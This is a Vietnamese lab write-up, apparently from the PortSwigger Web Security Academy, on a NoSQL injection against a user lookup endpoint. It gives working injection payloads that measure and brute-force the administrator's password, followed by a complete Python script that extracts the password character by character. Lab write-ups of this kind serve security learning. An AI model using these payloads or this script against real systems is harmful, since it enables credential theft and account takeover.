![image](https://github.com/user-attachments/assets/9d72021b-8a0d-4b69-b170-26c8f6e8172e)

![image](https://github.com/user-attachments/assets/1f7436d0-3eb6-4247-a714-114097424792)

Đầu tiên nháy để confirm có bị nosqli.

![image](https://github.com/user-attachments/assets/15d96fa9-ed3c-46da-8333-50cd163ac902)

Tiếp theo thì ta tiếp tục cho nó luôn đúng và đúng syntax để nó nhả data cho mình :">. lưu ý phải && == nhé, tại vì nó đang là operator.

![image](https://github.com/user-attachments/assets/2d12477e-80da-4837-a086-33b0ca35d8d0)

Đó nên là chắc chắn nó bị nosqli rồi nhé.

![image](https://github.com/user-attachments/assets/400152d0-2ad4-4cbd-85ae-4474eee632e7)

```
administrator'+%26%26+this.password.length+%3d%3d+§1§+||+'1'%3d%3d'2
```

Tiếp theo chúng ta test xem thì biết được rằng user `administrator` password nó có 8 kí tự.

Sau khi đã biết rồi thì bruteforce các kí tự đầu tiên thôi :3.

![image](https://github.com/user-attachments/assets/2fbb2614-ba38-4fe2-b429-90e081ded3bf)

```
administrator'+%26%26+this.password[0]+%3d%3d+'§a§
```

Sau khi thử thì kí tự đầu tiên của password là `n`

Thì cũng vẫn có 2 cách, cách 1 là tiếp tục bruteforce passwd, cách 2 là viết script thôi.

![image](https://github.com/user-attachments/assets/9e6bacc6-4b14-49a6-9040-bdd1602a39a4)

```
import requests
import string

# Cấu hình request
URL = "https://0a8c0075034292238347378a0042001f.web-security-academy.net/user/lookup"
COOKIES = {
    "session": "aEswibgetaP5QxZ0MZI0UF16Z6Lh7VI0"
}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
    "Accept": "*/*",
    "Referer": "https://0a8c0075034292238347378a0042001f.web-security-academy.net/my-account?id=wiener"
}

# Bộ ký tự cần thử: a-z, A-Z, 0-9
CHARSET = string.ascii_letters + string.digits
PASSWORD_LENGTH = 8  # Đã biết trước độ dài mật khẩu

def brute_force_password():
    password = ""
    
    for i in range(PASSWORD_LENGTH):  # Duyệt từng vị trí trong password
        for char in CHARSET:
            payload = f"administrator' && this.password[{i}]=='{char}"  # Inject NoSQL
            params = {"user": payload}
            
            print(f"[*] Đang thử ký tự thứ {i+1}: {char}")  # Debug
            response = requests.get(URL, headers=HEADERS, cookies=COOKIES, params=params)
            
            if "administrator" in response.text:
                password += char
                print(f"[+] Ký tự đúng: {char} --> {password}")
                break
    
    return password

# Chạy script
final_password = brute_force_password()
print(f"[+] Password cuối cùng: {final_password}")

input("Clap")
```

![image](https://github.com/user-attachments/assets/9f8ce96b-4c88-4d1e-8c43-1a6362ecca46)

Vậy là thành công.
